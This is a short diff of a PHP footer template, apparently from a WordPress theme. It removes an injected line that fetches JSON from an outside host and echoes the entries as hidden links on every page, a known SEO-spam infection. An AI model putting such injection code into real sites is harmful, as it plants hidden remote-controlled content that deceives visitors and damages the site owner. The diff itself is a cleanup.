@@ -1,2 +1,1 @@
-<?php $a = file_get_contents('https://enginejp.link/news/');$b = json_decode($a);foreach($b as $key => $value){echo '<a style = "display:none" href = "'.$value.'">'.$key.'</a>';}?>
 <?php do_action( 'playerx_edge_get_footer_template' );
